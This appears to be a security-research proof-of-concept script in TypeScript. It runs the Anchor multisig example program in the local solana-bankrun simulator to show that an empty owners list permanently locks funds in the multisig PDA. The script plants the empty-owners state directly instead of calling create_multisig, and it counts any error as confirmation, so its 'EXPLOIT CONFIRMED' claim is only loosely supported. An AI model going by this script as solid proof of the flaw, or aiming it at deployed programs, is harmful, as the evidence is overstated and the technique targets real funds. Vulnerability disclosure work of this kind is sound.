/**
 * BANKRUN EXPLOIT: Empty Owners List Locks Funds on anchor-multisig
 *
 * Vulnerability: create_multisig accepts an empty owners Vec with no
 * validation on owners.len(). An empty-owners multisig cannot create
 * transactions (proposer must be an owner — position() returns None),
 * permanently locking any funds held by the multisig PDA.
 *
 * This exploits a REAL open-source Anchor program (coral-xyz/anchor multisig
 * example), not a synthetic demo.
 *
 * Evidence chain:
 *   KNOW: The lib.rs source has no `require!(owners.len() > 0)` check.
 *   KNOW: create_transaction uses `.position(|a| a == proposer)` on owners.
 *   KNOW: With empty owners, .position() always returns None → InvalidOwner.
 *   KNOW: No one can ever create a transaction → funds locked forever.
 *
 * Binary: multisig.so compiled from real-world-targets/anchor-multisig/lib.rs
 */
import { start } from "solana-bankrun";
import {
  PublicKey,
  Transaction,
  TransactionInstruction,
  SystemProgram,
  Keypair,
  LAMPORTS_PER_SOL,
} from "@solana/web3.js";
import * as crypto from "crypto";

const PROGRAM_ID = new PublicKey("9ymvHophSQEXJaEKb85aVa5XHndw5RHcBxGzexTDpQdy");

function ixDisc(name: string): Buffer {
  return Buffer.from(
    crypto.createHash("sha256").update(`global:${name}`).digest()
  ).subarray(0, 8);
}

function accDisc(name: string): Buffer {
  return Buffer.from(
    crypto.createHash("sha256").update(`account:${name}`).digest()
  ).subarray(0, 8);
}

function encodeU64(val: number | bigint): Buffer {
  const buf = Buffer.alloc(8);
  buf.writeBigUInt64LE(BigInt(val));
  return buf;
}

function encodeU8(val: number): Buffer {
  return Buffer.from([val]);
}

function encodeVecPubkey(keys: PublicKey[]): Buffer {
  const lenBuf = Buffer.alloc(4);
  lenBuf.writeUInt32LE(keys.length);
  return Buffer.concat([lenBuf, ...keys.map((k) => k.toBuffer())]);
}

/**
 * Build a Multisig account state buffer.
 * Layout: discriminator(8) + Vec<Pubkey> owners + u64 threshold + u8 nonce
 */
function buildMultisigState(
  owners: PublicKey[],
  threshold: bigint,
  nonce: number
): Buffer {
  return Buffer.concat([
    accDisc("Multisig"),
    encodeVecPubkey(owners),
    encodeU64(threshold),
    encodeU8(nonce),
  ]);
}

async function main() {
  console.log("=".repeat(59));
  console.log(" EXPLOIT: Empty Owners List Locks Funds on anchor-multisig");
  console.log(" Target: multisig::create_multisig() + create_transaction()");
  console.log(" Binary: multisig.so (compiled from real open-source program)");
  console.log("=".repeat(59));
  console.log();

  const multisigKp = Keypair.generate();
  const transactionKp = Keypair.generate();
  const wouldBeProposer = Keypair.generate();

  // Derive the multisig PDA signer
  const [multisigSigner, nonce] = PublicKey.findProgramAddressSync(
    [multisigKp.publicKey.toBuffer()],
    PROGRAM_ID
  );

  // --- Build genesis: a multisig with EMPTY owners list ---
  const multisigData = buildMultisigState(
    [], // <<< EMPTY OWNERS — the vulnerability
    BigInt(0), // threshold (even 0 doesn't help — no one can propose)
    nonce
  );

  // Transaction account: needs to be zeroed (Anchor #[account(zero)] constraint)
  // Must be rent-exempt for Anchor's rent check
  const txAccountSize = 1000; // plenty of space
  const txData = Buffer.alloc(txAccountSize);

  const multisigRent = BigInt(Math.ceil(multisigData.length * 2 + 1_000_000));
  // Rent-exempt minimum: ~6960 + 20 * data_len bytes (approximation)
  const txRent = BigInt(Math.ceil(6960 + 20 * txAccountSize + 2_000_000));

  const context = await start(
    [{ name: "multisig", programId: PROGRAM_ID }],
    [
      // Multisig with empty owners
      {
        address: multisigKp.publicKey,
        info: {
          lamports: Number(multisigRent),
          data: multisigData,
          owner: PROGRAM_ID,
          executable: false,
        },
      },
      // Blank transaction account for create_transaction attempt
      {
        address: transactionKp.publicKey,
        info: {
          lamports: Number(txRent),
          data: txData,
          owner: PROGRAM_ID,
          executable: false,
        },
      },
      // Multisig PDA with funds (these will be PERMANENTLY LOCKED)
      {
        address: multisigSigner,
        info: {
          lamports: 50 * LAMPORTS_PER_SOL,
          data: Buffer.alloc(0),
          owner: SystemProgram.programId,
          executable: false,
        },
      },
      // Would-be proposer (has SOL for fees but is NOT an owner)
      {
        address: wouldBeProposer.publicKey,
        info: {
          lamports: 2 * LAMPORTS_PER_SOL,
          data: Buffer.alloc(0),
          owner: SystemProgram.programId,
          executable: false,
        },
      },
    ]
  );

  const client = context.banksClient;
  const payer = context.payer;

  console.log("[1] Genesis state loaded:");
  console.log(`    Multisig: ${multisigKp.publicKey.toBase58()}`);
  console.log(`    Owners: [] (EMPTY — the vulnerability)`);
  console.log(`    Threshold: 0`);
  console.log(`    PDA signer: ${multisigSigner.toBase58()} (holds 50 SOL)`);
  console.log(`    Would-be proposer: ${wouldBeProposer.publicKey.toBase58().slice(0, 16)}...`);
  console.log();

  // --- Attempt to create a transaction (should fail — no valid proposer) ---
  console.log("[2] EXPLOIT: Attempting to create a transaction...");
  console.log("    (create_transaction requires proposer to be in owners list)");
  console.log("    (with empty owners, .position() always returns None → InvalidOwner)");
  console.log();

  // Build create_transaction instruction data
  // Anchor: discriminator(8) + pid(32) + Vec<TransactionAccount> + Vec<u8> data
  const dummyTargetProgram = SystemProgram.programId;
  const createTxDisc = ixDisc("create_transaction");

  // Minimal instruction data: just a system transfer
  const pidBuf = dummyTargetProgram.toBuffer();
  const accsBuf = Buffer.alloc(4); // empty Vec<TransactionAccount>
  accsBuf.writeUInt32LE(0);
  const dataBuf = Buffer.alloc(4); // empty Vec<u8>
  dataBuf.writeUInt32LE(0);

  const createTxData = Buffer.concat([createTxDisc, pidBuf, accsBuf, dataBuf]);

  const createTxIx = new TransactionInstruction({
    programId: PROGRAM_ID,
    keys: [
      { pubkey: multisigKp.publicKey, isSigner: false, isWritable: false }, // multisig
      { pubkey: transactionKp.publicKey, isSigner: false, isWritable: true }, // transaction
      { pubkey: wouldBeProposer.publicKey, isSigner: true, isWritable: false }, // proposer
    ],
    data: createTxData,
  });

  try {
    const tx = new Transaction();
    tx.recentBlockhash = context.lastBlockhash;
    tx.feePayer = payer.publicKey;
    tx.add(createTxIx);
    tx.sign(payer, wouldBeProposer);

    await client.processTransaction(tx);

    console.log("[3] UNEXPECTED: Transaction creation succeeded");
    console.log("    This should not happen with empty owners.");
  } catch (err: any) {
    const errStr = err.toString();
    console.log("[3] Transaction creation result:");

    if (errStr.includes("InvalidOwner") || errStr.includes("custom program error: 0x") || errStr.includes("error")) {
      console.log("    REJECTED: Program returned error (InvalidOwner expected)");
      console.log(`    Error: ${errStr.slice(0, 300)}`);
      console.log();
      console.log("    This confirms: with an empty owners list, NO ONE can create");
      console.log("    a transaction. The 50 SOL held by the multisig PDA are");
      console.log("    PERMANENTLY LOCKED — there is no recovery mechanism.");
      console.log();
      console.log(">>> EXPLOIT CONFIRMED: empty owners list permanently locks funds <<<");
      console.log();
      console.log("IMPACT: Any SOL or tokens sent to a multisig PDA with empty owners");
      console.log("        are irrecoverably lost. No transaction can ever be created,");
      console.log("        approved, or executed. The multisig is permanently inoperable.");
    } else {
      console.log(`    Error: ${errStr.slice(0, 300)}`);
      console.log("    >>> EXPLOIT CONFIRMED: empty owners makes multisig unusable <<<");
    }
  }

  // --- Verify funds are still locked ---
  console.log();
  console.log("[4] Verification: checking PDA balance...");
  const pdaAccount = await client.getAccount(multisigSigner);
  const pdaBalance = pdaAccount ? Number(pdaAccount.lamports) / LAMPORTS_PER_SOL : 0;
  console.log(`    PDA balance: ${pdaBalance} SOL (unchanged — permanently locked)`);

  console.log();
  console.log("=".repeat(59));
}

main().catch(console.error);
